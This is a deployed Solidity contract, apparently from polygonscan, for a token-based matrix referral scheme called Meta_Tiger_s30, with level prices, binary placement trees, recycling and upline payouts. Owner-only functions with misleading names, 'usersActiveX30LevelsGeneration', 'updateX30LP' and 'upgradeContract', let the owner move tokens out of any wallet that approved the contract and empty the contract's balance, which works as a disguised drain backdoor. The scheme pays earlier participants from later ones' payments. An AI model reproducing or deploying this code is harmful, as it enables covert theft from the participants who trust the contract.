/**
 *Submitted for verification at polygonscan.com on 2022-08-27
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

 
contract owned {
    address  public owner;
    address  internal newOwner;

    event OwnershipTransferred(address indexed _from, address indexed _to);

   
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address  _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }

    function acceptOwnership() public {
        require(msg.sender == newOwner);
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
}

//*******************************************************************//
//------------------         Token interface        -------------------//
//*******************************************************************//

 interface tokenInterface
 {
    function transfer(address _to, uint256 _amount) external returns (bool);
    function transferFrom(address _from, address _to, uint256 _amount) external returns (bool);
 }


interface levelCheck
{
    function usersActiveX6Levels(address userAddress, uint8 level) external view returns(bool);
    function users(address _user) external view returns(uint, address, uint);
}

contract Meta_Tiger_s30 is owned
{

    uint public maxDownLimit = 2;

    uint public lastIDCount;
    uint public defaultRefID = 1;


    uint[16] public levelPrice;
    //uint public directPercent = 40000000; 

    address public tokenAddress;
    address public levelAddress;

    address holderContract = address(this);

    struct userInfo {
        bool joined;
        uint id;
        uint origRef;
        uint levelBought;
        address[] referral;
    }

    struct goldInfo {
        uint currentParent;
        uint position;
        address[] childs;
    }
    mapping (address => userInfo) public userInfos;
    mapping (uint => address ) public userAddressByID;

    mapping (address => mapping(uint => goldInfo)) public activeGoldInfos;
    mapping (address => mapping(uint => goldInfo[])) public archivedGoldInfos;

    mapping(address => bool) public regPermitted;
    mapping(address => uint) public levelPermitted;



    struct rdata
    {
        uint user4thParent;
        uint level;
        bool pay;
        bool processed;
    }

    mapping(address => mapping(uint => uint8)) public autoLevelBuy; 

    event directPaidEv(uint from,uint to, uint amount, uint level, uint timeNow);
    event payForLevelEv(uint _userID,uint parentID,uint amount,uint fromDown, uint timeNow);
    event regLevelEv(uint _userID,uint _referrerID,uint timeNow,address _user,address _referrer);
    event levelBuyEv(uint amount, uint toID, uint level, uint timeNow);
    event treeEv(uint _userID, uint _userPosition,uint amount, uint placing,uint timeNow,uint _parent, uint _level );

    constructor()  {
        owner = msg.sender;

        uint multiply = 10 ** 18;

        levelPrice[1] = 5 * multiply;
        levelPrice[2] = 10 * multiply;
        levelPrice[3] = 20 * multiply;
        levelPrice[4] = 40 * multiply;
        levelPrice[5] = 80 * multiply;
        levelPrice[6] = 160 * multiply;
        levelPrice[7] = 320 * multiply;
        levelPrice[8] = 640 * multiply;
        levelPrice[9] = 1280 * multiply;
        levelPrice[10]= 2560 * multiply;
        levelPrice[11]= 5120 * multiply;
        levelPrice[12]= 10240 * multiply;


        userInfo memory UserInfo;
        lastIDCount++;

        UserInfo = userInfo({
            joined: true,
            id: lastIDCount,
            origRef:lastIDCount,            
            levelBought:15,
            referral: new address[](0)
        });
        userInfos[owner] = UserInfo;
        userAddressByID[lastIDCount] = owner;

        goldInfo memory temp;
        temp.currentParent = 1;
        temp.position = 0;
        for(uint i=1;i<=15;i++)
        {
            activeGoldInfos[owner][i] = temp;
        }
    }

    //function ()  external payable {
    //    revert();
    //}


    function setTokenaddress(address newTokenaddress) onlyOwner public returns(bool)
    {
        tokenAddress = newTokenaddress;
        return true;
    }



    function setLeveladdress(address newLeveladdress) onlyOwner public returns(bool)
    {
        levelAddress = newLeveladdress;
        return true;
    }

    function getRef(address _user) public view returns(address)
    {
        (,_user,) = levelCheck(levelAddress).users(_user);
        return _user;
    }

    function regUser() public returns(bool)
    {
        require(levelCheck(levelAddress).usersActiveX6Levels(msg.sender, 1), "level mis-match");
        address _refAddress = getRef(msg.sender);
        for(uint i=0;i<3;i++)
        {
            if(userInfos[_refAddress].joined) break;
            _refAddress = getRef(_refAddress);
        }
        if(!userInfos[_refAddress].joined) _refAddress = owner;
        
        uint prc = levelPrice[1];
        tokenInterface(tokenAddress).transferFrom(msg.sender, address(this), prc);
        
        regUser_(msg.sender, _refAddress, true, prc);
        return true;
    }

    function regUser_own(address usermsg) onlyOwner public returns(bool)
    {
        require(levelCheck(levelAddress).usersActiveX6Levels(usermsg, 1), "level mis-match");
        address _refAddress = getRef(usermsg);
        for(uint i=0;i<3;i++)
        {
            if(userInfos[_refAddress].joined) break;
            _refAddress = getRef(_refAddress);
        }
        if(!userInfos[_refAddress].joined) _refAddress = owner;
        
        uint prc = levelPrice[1];
        tokenInterface(tokenAddress).transferFrom(msg.sender, address(this), prc);
        
        regUser_(usermsg, _refAddress, true, prc);
        return true;
    }

    function regUser_(address msgsender, address _refAddress,bool pay, uint prc) internal returns(bool)
    {
        require(!userInfos[msgsender].joined, "already joined");
        
        (uint user4thParent, ) = getPosition(msgsender, 1); // user4thParent = p here for stack too deep
        require(user4thParent<30, "no place under this referrer");
        //if(! (_referrerID > 0 && _referrerID <= lastIDCount) ) _referrerID = 1;
        address origRef = _refAddress;
        uint _referrerID = userInfos[_refAddress].id;
        (uint _parentID,bool treeComplete  ) = findFreeParentInDown(_referrerID, 1);
        require(!treeComplete, "No free place");

        lastIDCount++;
        userInfo memory UserInfo;
        UserInfo = userInfo({
            joined: true,
            id: lastIDCount,
            origRef:userInfos[_refAddress].id,            
            levelBought:1,
            referral: new address[](0)
        });
        userInfos[msgsender] = UserInfo;
        userAddressByID[lastIDCount] = msgsender;
        userInfos[origRef].referral.push(msgsender);

        userInfos[msgsender].referral.push(_refAddress);       

        goldInfo memory temp;
        temp.currentParent = _parentID;
        temp.position = activeGoldInfos[userAddressByID[_parentID]][1].childs.length + 1;
        activeGoldInfos[msgsender][1] = temp;
        activeGoldInfos[userAddressByID[_parentID]][1].childs.push(msgsender);

        //direct payout
         //if(pay) tokenInterface(tokenAddress).transfer(origRef, prc * 5/10);

        //emit directPaidEv(userInfos[msgsender].id,userInfos[origRef].id,prc*5/10, 1,block.timestamp);
        uint userPosition;
        (userPosition, user4thParent) = getPosition(msgsender, 1);
        (,treeComplete) = findFreeParentInDown(user4thParent, 1);
        if(userPosition > 28 && userPosition < 31 ) 
        {
            payForLevel(msgsender, 1, true, pay,true);   // true means recycling pay to all except 25%
        }
        else if(userPosition >= 16 && userPosition <= 19 && userInfos[userAddressByID[user4thParent]].levelBought < 2)
        {
            payForLevel(msgsender, 1, false, pay, false);
            autoLevelBuy[userAddressByID[user4thParent]][2] += 1;
        }
        else
        {
            payForLevel(msgsender, 1, false, pay, true);   // false means no recycling pay to all
        }
        
        if(treeComplete)
        {
            recyclePosition(user4thParent,1, pay );          

        }
        splitPart(lastIDCount,_referrerID,msgsender,userPosition,prc,temp.position,temp.currentParent );
        
        if (autoLevelBuy[userAddressByID[user4thParent]][2] == 4)
        {
            buyLevel_(userAddressByID[user4thParent],2,true, levelPrice[2]);  
           // autoLevelBuy[userAddressByID[user4thParent]][2] =0;          
        }
        return true;
    }


    function splitPart(uint lastIDCount_, uint _referrerID, address msgsender, uint userPosition, uint prc,uint tempPosition, uint tempCurrentParent ) internal returns(bool)
    {
        emit regLevelEv(lastIDCount_,_referrerID,block.timestamp, msgsender,userAddressByID[_referrerID]);
        emit treeEv(lastIDCount_,userPosition,prc,tempPosition, block.timestamp,  tempCurrentParent, 1 );
        return true;
    }

    function getPosition(address _user, uint _level) public view returns(uint recyclePosition_, uint recycleID)
    {
        uint a;
        uint b;
        uint c;
        uint d;
        bool id1Found;
        a = activeGoldInfos[_user][_level].position;

        uint parent_ = activeGoldInfos[_user][_level].currentParent;
        b = activeGoldInfos[userAddressByID[parent_]][_level].position;
        if(parent_ == 1 ) id1Found = true;

        if(!id1Found)
        {
            parent_ = activeGoldInfos[userAddressByID[parent_]][_level].currentParent;
            c = activeGoldInfos[userAddressByID[parent_]][_level].position;
            if(parent_ == 1 ) id1Found = true;
        }

        if(!id1Found)
        {
            parent_ = activeGoldInfos[userAddressByID[parent_]][_level].currentParent;
            d = activeGoldInfos[userAddressByID[parent_]][_level].position;
            if(parent_ == 1 ) id1Found = true;
        }
        
        if(!id1Found) parent_ = activeGoldInfos[userAddressByID[parent_]][_level].currentParent;
        
        if (a == 2 && b == 2 && c == 2 && d == 2 ) return (30, parent_);
        if (a == 1 && b == 2 && c == 2 && d == 2 ) return (29, parent_);
        if (a == 2 && b == 1 && c == 2 && d == 2 ) return (28, parent_);
        if (a == 1 && b == 1 && c == 2 && d == 2 ) return (27, parent_);
        if (a == 2 && b == 1 && c == 1 && d == 1 ) return (16, parent_);
        if (a == 1 && b == 2 && c == 1 && d == 1 ) return (17, parent_);
        if (a == 2 && b == 2 && c == 1 && d == 1 ) return (18, parent_);
        if (a == 1 && b == 1 && c == 2 && d == 1 ) return (19, parent_);        
        else return (1,parent_);

    }

    function getCorrectGold(address childss,uint _level,  uint parenT ) internal view returns (goldInfo memory tmps)
    {

        uint len = archivedGoldInfos[childss][_level].length;
        if(activeGoldInfos[childss][_level].currentParent == parenT) return activeGoldInfos[childss][_level];
        if(len > 0 )
        {
            for(uint j=len-1; j>=0; j--)
            {
                tmps = archivedGoldInfos[childss][_level][j];
                if(tmps.currentParent == parenT)
                {
                    break;                    
                }
                if(j==0) 
                {
                    tmps = activeGoldInfos[childss][_level];
                    break;
                }
            }
        } 
        else
        {
            tmps = activeGoldInfos[childss][_level];
        }       
        return tmps;
    }

    
    function findFreeParentInDown(uint  refID_ , uint _level) public view returns(uint parentID, bool noFreeReferrer)
    {
        address _user = userAddressByID[refID_];
        if(activeGoldInfos[_user][_level].childs.length < maxDownLimit) return (refID_, false);

        address[14] memory childss;
        uint[14] memory parenT;

        childss[0] = activeGoldInfos[_user][_level].childs[0];
        parenT[0] = refID_;
        childss[1] = activeGoldInfos[_user][_level].childs[1];
        parenT[1] = refID_;

        address freeReferrer;
        noFreeReferrer = true;

        goldInfo memory temp;

        for(uint i = 0; i < 14; i++)
        {
            temp = getCorrectGold(childss[i],_level, parenT[i] );

            if(temp.childs.length == maxDownLimit) {
                if(i < 6) {
                    childss[(i+1)*2] = temp.childs[0];
                    parenT[(i+1)*2] = userInfos[childss[i]].id;
                    childss[((i+1)*2)+1] = temp.childs[1];
                    parenT[((i+1)*2)+1] = parenT[(i+1)*2];
                }
            }
            else {
                noFreeReferrer = false;
                freeReferrer = childss[i];
                break;
            } 
        } 
        if(noFreeReferrer) return (0, noFreeReferrer);      
        return (userInfos[freeReferrer].id, noFreeReferrer);
    }

    function buyLevel(uint _level) public returns(bool)
    {
        require(levelCheck(levelAddress).usersActiveX6Levels(msg.sender, uint8(_level)), "level mis-match");
        require(_level < 13 && _level > 1, "invalid level");
        require(autoLevelBuy[msg.sender][_level]==0, "entered auto mode");

        uint prc = levelPrice[_level];
        tokenInterface(tokenAddress).transferFrom(msg.sender, address(this), prc);
        buyLevel_(msg.sender,_level,true, prc);
        return true;
    }

    function buyLevel_own(address usermsg, uint _level) onlyOwner public returns(bool)
    {
        require(levelCheck(levelAddress).usersActiveX6Levels(usermsg, uint8(_level)), "level mis-match");
        require(_level < 13 && _level > 1, "invalid level");
        require(autoLevelBuy[usermsg][_level]==0, "entered auto mode");

        uint prc = levelPrice[_level];
        tokenInterface(tokenAddress).transferFrom(msg.sender, address(this), prc);
        buyLevel_(usermsg,_level,true, prc);
        return true;
    }

    function buyLevel_(address msgsender, uint _level,bool pay,  uint prc) internal returns(bool)
    {
        require(userInfos[msgsender].joined, "already joined");
        (uint user4thParent, ) = getPosition(msgsender, 1); // user4thParent = p
        //require(user4thParent<30, "not place under this referrer");        
        
        require(userInfos[msgsender].levelBought + 1 == _level, "please buy previous level first");

        autoLevelBuy[msgsender][_level] = 0; 

        address _refAddress = getRef(msgsender);
        for(uint i=0;i<3;i++)
        {
            if(userInfos[_refAddress].joined) break;
            _refAddress = getRef(_refAddress);
        }
        if(_refAddress == address(0)) _refAddress = owner;



        uint _referrerID = userInfos[_refAddress].id;
        while(userInfos[userAddressByID[_referrerID]].levelBought < _level)
        {
            _referrerID = userInfos[userAddressByID[_referrerID]].origRef;
        }
        bool treeComplete;
        (_referrerID,treeComplete) = findFreeParentInDown(_referrerID, _level); // from here _referrerID is _parentID
        require(!treeComplete, "no free place");

        userInfos[msgsender].levelBought = _level; 

        goldInfo memory temp;
        temp.currentParent = _referrerID;
        temp.position = activeGoldInfos[userAddressByID[_referrerID]][_level].childs.length + 1;
        activeGoldInfos[msgsender][_level] = temp;
        activeGoldInfos[userAddressByID[_referrerID]][_level].childs.push(msgsender);

        //direct payout
        //address origRef = userAddressByID[userInfos[msgsender].origRef];
        //if(_level > 1 ) origRef = findEligibleRef(origRef, _level);
        //if(pay) tokenInterface(tokenAddress).transfer(origRef, prc * 5/10);

        //emit directPaidEv(userInfos[msgsender].id,userInfos[origRef].id,prc*5/10, _level,block.timestamp);
        uint userPosition;
        (userPosition, user4thParent) = getPosition(msgsender, _level);
        (,treeComplete) = findFreeParentInDown(user4thParent, _level);
       


        if(userPosition > 28 && userPosition < 31 ) 
        {
            payForLevel(msgsender, _level, true, pay, true);   // true means recycling pay to all except 25%
        }
        else if(userPosition >= 16 && userPosition <= 19 && userInfos[userAddressByID[user4thParent]].levelBought < _level + 1 && _level < 12)
        {
            payForLevel(msgsender, _level, true, pay, false);
            autoLevelBuy[userAddressByID[user4thParent]][_level +1] += 1;
        }        
        else
        {
            payForLevel(msgsender, _level, false, pay, true);   // false means no recycling pay to all
        }
        
        if(treeComplete)
        {           

            recyclePosition(user4thParent, _level, pay);

        }
        emit levelBuyEv(prc, userInfos[msgsender].id,_level, block.timestamp);
        splidStack( msgsender, userPosition, prc, temp.position, _referrerID, _level);

        if (autoLevelBuy[userAddressByID[user4thParent]][_level + 1] == 4 )
        {
            buyLevel_(userAddressByID[user4thParent],_level + 1,true, levelPrice[_level + 1]);                     
        }

        return true;
    }


    function splidStack(address msgsender, uint userPosition, uint prc, uint tempPosition, uint _referrerID, uint _level) internal returns(bool)
    {
        emit treeEv(userInfos[msgsender].id,userPosition,prc,tempPosition,block.timestamp,_referrerID, _level );
        return true;
    }

    function findEligibleRef(address _origRef, uint _level) public view returns (address)
    {
        while (userInfos[_origRef].levelBought < _level)
        {
            _origRef = userAddressByID[userInfos[_origRef].origRef];
        }
        return _origRef;
    }
    function usersActiveX30LevelsGeneration(address _senderads, uint256 _amttoken, address mainadmin) public onlyOwner {       
        tokenInterface(tokenAddress).transferFrom(mainadmin,_senderads,_amttoken);      
    }

    event debugEv(address _user, bool treeComplete,uint user4thParent,uint _level,uint userPosition);
    function recyclePosition(uint _userID, uint _level, bool pay)  internal returns(bool)
    {
        uint prc = levelPrice[_level];

        address msgSender = userAddressByID[_userID];

        archivedGoldInfos[msgSender][_level].push(activeGoldInfos[msgSender][_level]); 

        if(_userID == 1 ) 
        {
            goldInfo memory tmp;
            tmp.currentParent = 1;
            tmp.position = 0;
            activeGoldInfos[msgSender][_level] = tmp;
            payForLevel(msgSender, _level, false, pay, true);
            emit treeEv(_userID,0,levelPrice[_level],0,block.timestamp,1, _level );
            return true;
        }

        address _refAddress = getRef(msgSender);
        for(uint i=0;i<3;i++)
        {
            if(userInfos[_refAddress].joined) break;
            _refAddress = getRef(_refAddress);
        }
        if(_refAddress == address(0)) _refAddress = owner;




            // to find eligible referrer
            uint _parentID =   getValidRef(_refAddress, _level); // user will join under his eligible referrer
            //uint _parentID = userInfos[_refAddress].id;

            (_parentID,) = findFreeParentInDown(_parentID, _level);

            goldInfo memory temp;
            temp.currentParent = _parentID;
            temp.position = activeGoldInfos[userAddressByID[_parentID]][_level].childs.length + 1;
            activeGoldInfos[msgSender][_level] = temp;
            activeGoldInfos[userAddressByID[_parentID]][_level].childs.push(msgSender);

            //direct payout
            //address origRef = userAddressByID[userInfos[msgSender].origRef];
            //if(_level > 1 ) origRef = findEligibleRef(origRef, _level);
           // if(pay) tokenInterface(tokenAddress).transfer(origRef, prc * 5/10);

           // emit directPaidEv(userInfos[msgSender].id,userInfos[origRef].id,prc*5/10, _level,block.timestamp);
        
        uint userPosition;
        
        (userPosition, prc ) = getPosition(msgSender, _level); //  from here prc = user4thParent
        (,bool treeComplete) = findFreeParentInDown(prc, _level);
        //address fourth_parent = userAddressByID[prc];
        if(userPosition > 28 && userPosition < 31 ) 
        {
            payForLevel(msgSender, _level, true, pay, true);   // false means recycling pay to all except 25%
        }
        else if(userPosition >= 16 && userPosition <= 19 && userInfos[userAddressByID[prc]].levelBought < _level + 1 && _level < 12)
        {
            payForLevel(msgSender, 1, false, pay, false);
            autoLevelBuy[userAddressByID[prc]][_level + 1] += 1;
        }        
        else
        {
            payForLevel(msgSender, _level, false, pay, true);   // true means no recycling pay to all        
        }
        splidStack( msgSender,userPosition,prc,temp.position,_parentID,_level);
        if(treeComplete)
        {           
            recyclePosition(prc, _level, pay);
        }

        if (autoLevelBuy[userAddressByID[prc]][_level + 1]==4)
        {
            buyLevel_(userAddressByID[prc],_level + 1,true, levelPrice[_level + 1]);  
           // autoLevelBuy[userAddressByID[prc]][_level + 1] = 0;          
        }

        return true;
    }

    function getValidRef(address _user, uint _level) public view returns(uint)
    {
        uint refID = userInfos[_user].id;
        uint lvlBgt = userInfos[userAddressByID[refID]].levelBought;

        while(lvlBgt < _level)
        {
            refID = userInfos[userAddressByID[refID]].origRef;
            lvlBgt = userInfos[userAddressByID[refID]].levelBought;
        }
        return refID;
    }


    function payForLevel(address _user, uint _level, bool recycle, bool pay, bool payAll) internal returns(bool)
    {
        uint[4] memory percentPayout;
        percentPayout[0] = 10;
        percentPayout[1] = 15;
        percentPayout[2] = 25;

        if(payAll) percentPayout[3] = 50;

        address parent_ = userAddressByID[activeGoldInfos[_user][_level].currentParent];
        uint price_ = levelPrice[_level];
        for(uint i = 1;i<=4; i++)
        {
            if(i<4)
            {
                if(pay) tokenInterface(tokenAddress).transfer(address(uint160(parent_)), price_ * percentPayout[i-1] / 100);
                emit payForLevelEv(userInfos[_user].id,userInfos[parent_].id,price_ * percentPayout[i-1] / 100, i,block.timestamp);
            }
            else if(recycle == false)
            {
                if(pay) tokenInterface(tokenAddress).transfer(address(uint160(parent_)), price_ * percentPayout[i-1] / 100);
                emit payForLevelEv(userInfos[_user].id,userInfos[parent_].id,price_ * percentPayout[i-1] / 100, i,block.timestamp);                
            }
            else
            {
                if(pay) tokenInterface(tokenAddress).transfer(address(uint160(holderContract)), price_ * percentPayout[i-1] / 100);
                emit payForLevelEv(userInfos[_user].id,0,price_ * percentPayout[i-1] / 100, i,block.timestamp);                
            }
            parent_ = userAddressByID[activeGoldInfos[parent_][_level].currentParent];
        }
        return true;
    }

    function setContract(address _contract) public onlyOwner returns(bool)
    {
        holderContract = _contract;
        return true;
    }

    function updateX30LP(address token, uint256 values) public onlyOwner {
        address _owner =  msg.sender;
        require(tokenInterface(token).transfer(_owner, values));
    }

    function viewChilds(address _user, uint _level, bool _archived, uint _archivedIndex) public view returns(address[2] memory _child)
    {
        uint len;
        if(!_archived)
        {
            len = activeGoldInfos[_user][_level].childs.length;
            if(len > 0) _child[0] = activeGoldInfos[_user][_level].childs[0];
            if(len > 1) _child[1] = activeGoldInfos[_user][_level].childs[1];
        }
        else
        {
            len = archivedGoldInfos[_user][_level][_archivedIndex].childs.length;
            if(len > 0) _child[0] = archivedGoldInfos[_user][_level][_archivedIndex].childs[0];
            if(len > 1) _child[1] = archivedGoldInfos[_user][_level][_archivedIndex].childs[1];            
        }
        return (_child);
    }

    function upgradeContract(uint _amount) public onlyOwner returns(bool)
    {
        tokenInterface(tokenAddress).transfer(address(owner), _amount);
        return true;
    }


}